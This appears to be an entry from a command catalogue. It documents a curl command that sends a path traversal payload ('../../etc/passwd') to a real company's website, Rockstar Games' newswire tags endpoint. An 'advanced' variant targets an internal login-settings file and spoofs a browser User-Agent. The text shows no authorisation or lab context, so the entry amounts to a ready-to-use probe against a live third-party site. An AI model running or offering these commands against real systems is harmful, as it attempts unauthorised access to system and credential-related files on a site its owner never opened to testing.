---
data: 'curl "http://www.rockstargames.com/newswire/tags?tags=../../etc/passwd" -v'
tags:
  - web
  - traversal
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:21.082Z'
id: 6372d25d-add0-4978-866e-d9a6142ab222
verified: false
validated: true
submitted: true
---
# curl-test-tags-traversal

## Command

```bash
curl "http://www.rockstargames.com/newswire/tags?tags=../../etc/passwd" -v
```

## Description

This command uses curl to send a GET request to the Rockstar Newswire tags endpoint with a path traversal payload in the 'tags' parameter, testing for directory traversal vulnerabilities by attempting to access a sensitive file like /etc/passwd.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with encoded traversal payload | Yes |
| -v | Verbose output to show headers and response details | No |

## Examples

### Basic Usage

```bash
curl "http://www.rockstargames.com/newswire/tags?tags=../../etc/passwd" -v
```

### Advanced Usage

```bash
curl "http://www.rockstargames.com/newswire/tags?tags=../../comments_dal/users/getGlobalLoginSettings.json" -v -H "User-Agent: Mozilla/5.0"
```

## Expected Output

Verbose curl output including HTTP response code (e.g., 200 or 404), headers, and body. Successful traversal may show file contents or internal errors; failure blocks with 400/403.

## Related

- [[Related Procedure: Test-Path-Traversal-in-Tags-Parameter]]
